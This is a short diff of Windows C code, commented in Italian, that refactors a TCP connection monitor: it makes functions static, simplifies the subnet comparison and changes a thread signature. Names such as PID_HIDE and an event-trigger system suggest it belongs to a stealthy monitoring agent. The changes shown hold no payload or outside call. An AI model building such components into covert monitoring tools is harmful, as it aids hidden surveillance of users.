@@ -38,7 +38,7 @@ static GetTcpTable_t pGetTcpTable = NULL;
 static BOOL em_mc_cp = FALSE;
 
 // Inizializza la tabella degli indirizzi locali 
-void InitIPAddrLocal()
+static void InitIPAddrLocal()
 {
 	DWORD dwSize;
 
@@ -61,18 +61,16 @@ void InitIPAddrLocal()
 }
 
 // Torna TRUE se i due IP sono nella stessa subnet
-BOOL IPNetCmp(DWORD ip1, DWORD ip2, DWORD netmask)
+static BOOL IPNetCmp(DWORD ip1, DWORD ip2, DWORD netmask)
 {
 	ip1 &= netmask;
 	ip2 &= netmask;
-	if (ip1 == ip2)
-		return TRUE;
-	else
-		return FALSE;
+
+	return (ip1 == ip2);
 }
 
 // Torna TRUE se ip_addr e' nella LAN
-BOOL IPAddrIsLocal(DWORD ip_addr)
+static BOOL IPAddrIsLocal(DWORD ip_addr)
 {
 	DWORD i;
 
@@ -89,8 +87,7 @@ BOOL IPAddrIsLocal(DWORD ip_addr)
 	return FALSE;
 }
 
-
-DWORD MonitorConnection(DWORD dummy)
+static DWORD WINAPI MonitorConnection(LPVOID lpParameter)
 {
 	PMIB_TCPTABLE_OWNER_PID pTcpTable;
 	PID_HIDE pid_hide = NULL_PID_HIDE_STRUCT;
@@ -161,7 +158,7 @@ DWORD MonitorConnection(DWORD dummy)
 						if (!em_mc_connection_table[i].present) {
 							em_mc_connection_table[i].present = TRUE;
 							TriggerEvent(em_mc_connection_table[i].event_param.start_action, em_mc_connection_table[i].event_id);
-							CreateRepeatThread(em_mc_connection_table[i].event_id, em_mc_connection_table[i].event_param.repeat_action, em_mc_connection_table[i].event_param.count, em_mc_connection_table[i].event_param.delay);
+							CreateRepeatThread(em_mc_connection_table[i].event_id, &em_mc_connection_table[i].event_param);
 						}
 						conn_found = TRUE;
 						break;
@@ -185,7 +182,6 @@ DWORD MonitorConnection(DWORD dummy)
 		// not reached
 	return 0;
 }
-
 
 void WINAPI EM_MonConnAdd(cJSON* conf_json, EVENT_PARAM* event_param, DWORD event_id)
 {
